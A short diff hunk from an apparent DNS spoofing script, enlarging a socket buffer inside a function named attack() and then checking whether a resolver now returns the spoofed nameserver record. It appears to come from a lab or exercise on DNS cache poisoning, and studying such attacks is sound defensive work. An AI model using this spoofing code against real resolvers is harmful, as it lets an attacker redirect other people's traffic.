@@ -86,7 +86,7 @@ def attack():
 
         # check to see if it worked
         sock.sendto(bytes(dns_request), (my_ip, dns_port))
-        data = sock.recv(1024)
+        data = sock.recv(4096)
         res = DNS(data[2:])
         try:
             if res[DNS].ns and res[DNS].ns.rdata == spoof:
